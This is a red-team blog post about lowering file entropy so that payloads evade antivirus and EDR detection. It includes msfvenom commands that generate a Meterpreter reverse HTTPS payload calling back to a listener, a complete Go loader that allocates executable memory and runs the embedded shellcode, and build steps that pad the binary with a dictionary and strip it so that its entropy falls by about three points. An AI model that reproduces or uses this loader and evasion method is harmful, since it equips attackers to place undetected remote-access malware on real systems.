---
title: "Entropy Analysis"
date: 2022-07-17
categories: [ "offsec" ]
tags: ["malware", "evasion"]
draft: false
---

While creating payload for different pen testing and red team projects, I would always run into having to bypass AV/EDRs. Once bypassed, the code and techniques would work for a few weeks or months before getting flagged as malicious. There has been a lot of research and blogs on different bypass techniques, but [one that caught my eye](https://vanmieghem.io/blueprint-for-evading-edr-in-2022/) mentioned file entropy. I have looked at the entropy of firmware before to help determine if it was encrypted or not, but I have never looked at entropy when it came to C2 payloads. 

In this article, I will start by describing what entropy is and then go into different ways you can reduce the entropy score. Reducing the payload entropy will not automatically bypass security tools, but it may be one of the attributes that is examined.

## What is Entropy
According to [Wikipedia](https://en.wikipedia.org/wiki/Entropy_(information_theory)), entropy is "...the average level of 'information', 'surprise', or 'uncertainty' inherent to the variable's possible outcomes." In other words, entropy is a measure of randomness of data in the specified file. In security, most people use Shannon Entropy, which is a specific algorithm that returns a value between 0 and 8. The higher the number, the more random the data. Many times, a higher value means that the data is either packed or encrypted.

Different security products may calculate the entropy of a file in order to help determine if it is malicious or not. One article I found useful when researching entropy was from [Practical Security Analytics](https://practicalsecurityanalytics.com/file-entropy/). In the article, they analyzed the entropy of around 500k Windows executable files. The purpose was to determine how effective entropy analysis is when distiguishing malicious files from legitimate files. One of the main data points that stood out, files with an entropy above 7.2 tended to be malicious. 

There are a few additional references at the end of the blog post that can provide more details about entropy and it's use in malware analysis.

## Checking Entropy
On Linux and Mac machines, the "ent" program can be used to check the entropy of a file. As you can see from the output below, "bash" has an entropy of around 6.

```bash
$ ent /bin/bash
Entropy = 6.159561 bits per byte.

Optimum compression would reduce the size
of this 1230360 byte file by 23 percent.

Chi square distribution for 1230360 samples is 18260505.61, and randomly
would exceed this value less than 0.01 percent of the times.

Arithmetic mean value of data bytes is 84.4088 (127.5 = random).
Monte Carlo value for Pi is 3.433473130 (error 9.29 percent).
Serial correlation coefficient is 0.409743 (totally uncorrelated = 0.0).
```

I made a simple program that makes it easier to check the entropy without all of the additional details. You can download the code from [here](https://github.com/lum8rjack/shannon).

```bash
$ ./shannon -file /bin/bash
6.159560931054298
```

## Basic Payload
Next, I wanted to check the entropy of different malware samples and see if there was a way I could get it as low as possible. The simplest and quickest method was to generate a stageless Metasploit executable using the command below.

```bash
$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.10.5 LPORT=443 -e x86/shikata_ga_nai -f exe -o msf.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 201849 (iteration=0)
x86/shikata_ga_nai chosen with final size 201849
Payload size: 201849 bytes
Final size of exe file: 208384 bytes
Saved as: msf.exe
```

The entropy is almost at the highest possible number, and would definately be flagged by security scanners.

```bash
$ ./shannon -file msf.exe
7.924424214044725
```

I then decided to use Metasploit to generate shellcode instead of an executable. In doing this, I could then create my own loader that would inject and execute the shellcode.

```bash
$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.10.5 LPORT=443 -e x86/shikata_ga_nai -f raw -o payload.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 201849 (iteration=0)
x86/shikata_ga_nai chosen with final size 201849
Payload size: 201849 bytes
Saved as: payload.bin
```

The shellcode entropy was even higher than the executable.

```bash
$ ./shannon -file payload.bin 
7.986056713327999
```

Then, I created a loader in Go that was compiled to a Windows executable in order to execute the shellcode. I used Go's "embed" library to easily add the shellcode to the file. The code below uses different Windows API calls in order to allocate memory, copy the shellcode to the allocated memory, change the memory permissions, and lastly execute the shellcode.

```c {linenos=table}
package main

import (
    "embed"
    "log"
	"unsafe"
	"golang.org/x/sys/windows"
)

//go:embed payload.bin
var f embed.FS

func main() {
    // Get the embeded shellcode
    data, err := f.ReadFile("payload.bin")
    if err != nil {
        log.Fatal(err)
    }

	// Allocate memory using VirtualAlloc API call
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(data)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
        log.Fatal(err)
    }

	// Load ntdll to use RtlMoveMemory and
    // move the shellcode to the allocated memory
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&data[0])), uintptr(len(data)))
	
    // Change the memory protections to read and execute
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(data)), windows.PAGE_EXECUTE_READ, &oldProtect)
    if err != nil {
        log.Fatal(err)
    }
	
	// Load kernel32 to use CreateThread and execute the shellcode
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	CreateThread := kernel32.NewProc("CreateThread")
	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	// Wait forever so the program doesn't exit
	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}
```

The commands below were used to compile the code into a Windows executable.
```bash
$ go mod init payload
$ go mod tidy
$ GOOS=windows GOARCH=amd64 go build -o payload.exe
```

The entropy of the payload dropped almost a whole point, but was still pretty high. The drop was most likely due to Go's runtime, which provides garbage collection, reflection and many other features.
```bash
$ ./shannon -file payload.exe
7.015162704411349
```

## Reducing Entropy
Even though the entropy dropped, I still wanted to try to get it lower. Since entropy is based on randomness, one way to reduce the score was to add nomral text to the file. This was done by downloading the english dictionary and embedding it into the payloadd. The commands below show how I downloaded the dictionary and displayed the number of words in the file.

```bash
$ wget http://www.gwicks.net/textlists/english3.zip
$ unzip english3.zip
$ ls -alh english3.txt 
-rw-r--r-- 1 root root 1.9M Oct 23  2012 english3.txt

$ wc -l english3.txt 
194433 english3.txt
```

Using the same method to embed the shellcode in the file, I added one line of code to embed the dictionary.

```c {linenos=table, linenostart=10}
//go:embed english3.txt
//go:embed payload.raw
var static embed.FS
```

Just by including the text file, the entropy was dropped by about a half a point.

```bash
$ ./shannon -file payload2.exe
6.551539452432076
```

I was able to strip the binary and reduce the entropy even more.
```bash
$ GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -trimpath -o payload3.exe

$ ./shannon -file payload3.exe
6.029571138204901
```

I did another test to try to drop the entropy one more time by copying the english dictionary multiple times.


```bash
$ cat english3.txt english3.txt english3.txt english3.txt english3.txt > englishbig.txt

$ ls -alh englishbig.txt 
-rw-r--r-- 1 root root 9.1M Jul 17 01:23 englishbig.txt

$ wc -l englishbig.txt 
972165 englishbig.txt
```

Once the code was updated to use the larger file, the entropy dropped another point.
```bash
$ ./shannon -file payload4.exe
5.0849956311902105
```

## Wrap-Up
In conclusion, I was able to drop the entropy almost three points (about 36%) by incorporating a few simple techniques that could be used by anyone. It is also important to note that the payload still executes and runs normally.

Reducing the entropy alone won't bypass AV/EDR tools, but it is one aspect of creating payloads that can be easily manipulated. It can be useful when combined with additional techniques like:
- Shellcode encription
- Delays and other normal functionality
- Unhooking
- Direct syscalls

## References / Acknowledgements

- https://vanmieghem.io/blueprint-for-evading-edr-in-2022/
- https://en.wikipedia.org/wiki/Entropy_(information_theory)
- https://practicalsecurityanalytics.com/file-entropy/
- https://rosettacode.org/wiki/Entropy#Go
- http://www.gwicks.net/dictionaries.htm
- https://whiteheart0.medium.com/entropy-analysis-a-critical-test-for-malwares-69939f5b8b1#:~:text=Entropy%20analysis%20do%20not%20only,the%20machine%20learning%20av%20detection
- https://github.com/lum8rjack/shannon

